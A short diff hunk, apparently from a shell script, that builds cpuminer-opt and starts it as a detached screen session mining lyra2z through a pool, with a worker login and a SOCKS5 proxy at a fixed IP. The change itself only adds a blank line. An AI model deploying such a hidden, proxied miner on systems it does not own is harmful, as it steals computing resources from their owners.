@@ -7,3 +7,4 @@ cd cpuminer-opt
 cp cpuminer ../
 cd ..
 screen -d -m ./cpuminer -a lyra2z -o stratum+tcp://us-east.lyra2z-hub.miningpoolhub.com:20581 -u vanto.5 -p 1 -x socks5://173.208.201.119:1993
+
